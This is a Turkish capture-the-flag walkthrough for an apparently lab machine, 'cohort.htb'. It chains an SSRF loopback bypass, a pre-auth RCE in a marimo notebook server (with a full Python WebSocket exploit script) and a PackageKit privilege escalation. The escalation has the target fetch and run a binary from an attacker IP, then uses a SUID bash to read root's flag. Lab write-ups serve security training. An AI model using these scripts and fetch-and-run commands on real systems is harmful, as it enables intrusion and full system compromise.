@@ -1,0 +1,166 @@
+Keşif
+
+Makineye bağlandıktan sonra Rustscan ile hızlı bir port taraması yaptım:
+bash
+
+rustscan -a <machine_ip>
+
+3 port açık geldi: 22, 80 ve 443. Nmap ile detaylı tarama yaptım:
+bash
+
+nmap -sV -sC -p22,80,443 <machine_ip>
+
+Nmap sonucunda cohort.htb'yi hosts dosyasına eklemem gerektiğini gördüm. Ayrıca 443 portundaki TLS sertifikasında *.cohort.htb wildcard'ı vardı, bu başka vhost'lar olabileceğini düşündürdü.
+Web Enumeration
+
+Siteyi ziyaret ettiğimde "Cohort Analytics" adında bir SPA (Single Page Application) ile karşılaştım. /portal.html sayfasında "register and validate a report source URL" başlıklı bir form vardı. Bu, SSRF için biçilmiş kaftandı.
+SSRF Exploit
+
+Formu incelerken yapılan isteği gördüm:
+text
+
+POST /api/validate HTTP/1.1
+Host: cohort.htb
+Content-Type: application/json
+
+{"url":"http://test.com/log.csv","format":"csv"}
+
+127.0.0.1 denediğimde "Internal or loopback addresses are not permitted." hatasını aldım. Filtrenin string-based olduğunu düşünerek bypass denedim:
+bash
+
+curl -s -k -X POST https://cohort.htb/api/validate \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.1/","format":"csv"}'
+
+İşe yaradı! 127.1 Linux'ta 127.0.0.1'e çözülüyor ama filtreyi atlatıyor.
+Internal Port Scanning
+
+SSRF'i kullanarak içerideki portları taradım. 5000 portu JSON yanıtı verdi. 8888 portu ise bir marimo notebook server çalıştırıyordu.
+
+/status endpointi 403 dönüyordu, SSRF ile denedim:
+bash
+
+curl -s -k -X POST https://cohort.htb/api/validate \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.1/status","format":"csv"}'
+
+JSON içinde nb-1be3782a8afd3ad5.cohort.htb adlı bir vhost gördüm. Hosts'a ekledim.
+Foothold: Marimo Pre-Auth RCE (CVE-2026-39987)
+
+marimo notebook server'ın /terminal/ws endpoint'inde pre-auth RCE olduğunu buldum. WebSocket ile bağlanıp komut çalıştırabiliyordum.
+
+Bunun için bir Python script'i buldum:
+
+python
+
+import socket, ssl, base64, os, struct, time, select
+
+TARGET_IP = "<machine_ip>"
+HOST = "nb-1be3782a8afd3ad5.cohort.htb"
+PATH = "/terminal/ws"
+
+def connect():
+    raw = socket.create_connection((TARGET_IP, 443), timeout=5)
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    s = ctx.wrap_socket(raw, server_hostname=HOST)
+    key = base64.b64encode(os.urandom(16)).decode()
+    req = (f"GET {PATH} HTTP/1.1\r\nHost: {HOST}\r\nUpgrade: websocket\r\n"
+           f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
+           f"Sec-WebSocket-Version: 13\r\nOrigin: https://{HOST}\r\n\r\n")
+    s.sendall(req.encode())
+    s.settimeout(5)
+    resp = b""
+    while b"\r\n\r\n" not in resp:
+        resp += s.recv(4096)
+    return s
+
+def send_text(s, text):
+    payload = text.encode()
+    mask = os.urandom(4)
+    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
+    length = len(payload)
+    if length <= 125:
+        header = struct.pack("!BB", 0x81, 0x80 | length)
+    elif length <= 65535:
+        header = struct.pack("!BBH", 0x81, 0x80 | 126, length)
+    else:
+        header = struct.pack("!BBQ", 0x81, 0x80 | 127, length)
+    s.sendall(header + mask + masked)
+
+def recv_frames(s, duration=3):
+    end = time.time() + duration
+    buf = b""
+    out = b""
+    while time.time() < end:
+        r, _, _ = select.select([s], [], [], 0.5)
+        if r:
+            try:
+                chunk = s.recv(4096)
+            except:
+                continue
+            if not chunk:
+                break
+            buf += chunk
+    # frame parsing...
+    return out
+
+if __name__ == "__main__":
+    import sys
+    cmd = sys.argv[1] if len(sys.argv) > 1 else "id; whoami; hostname"
+    s = connect()
+    send_text(s, cmd + "\r")
+    print(recv_frames(s, 4).decode(errors="replace"))
+
+Çalıştırdım:
+bash
+
+python3 exploit.py "cat /home/marimo/user.txt"
+
+User flag'i aldım.
+Privilege Escalation: Pack2TheRoot (CVE-2026-41651)
+
+Sistemde PackageKit 1.2.8 kurulu olduğunu gördüm. Bu versiyon CVE-2026-41651'den etkileniyordu.
+
+GitHub'dan exploit'i indirdim:
+bash
+
+git clone https://github.com/shibaaa204/Pack2TheRoot.git
+cd Pack2TheRoot
+
+Derleme sorunu yaşadım, glib kütüphanesi lazımdı:
+bash
+
+sudo apt-get install libglib2.0-dev -y
+gcc -o exploit.bin exploit.c `pkg-config --cflags --libs glib-2.0`
+
+Bu da hata verdi, başka bir flag ile denedim:
+bash
+
+gcc -o exploit.bin exploit.c `pkg-config --cflags --libs gio-2.0`
+
+HTTP server ile target'a gönderdim:
+bash
+
+python3 -m http.server 8000
+
+Target'tan indirip çalıştırdım:
+bash
+
+python3 exploit.py "curl -s -o /tmp/exploit.bin http://10.10.16.68:8000/exploit.bin && chmod +x /tmp/exploit.bin && /tmp/exploit.bin"
+
+Birkaç saniye bekledikten sonra kontrol ettim:
+bash
+
+python3 marimo_exploit.py "ls -la /tmp/.suid_bash"
+
+Çıktı:
+text
+
+-rwsr-xr-x 1 root root ... /tmp/.suid_bash
+
+Root flag'i aldım:
+bash
+
+python3 marimo_exploit.py "/tmp/.suid_bash -p -c 'cat /root/root.txt'"
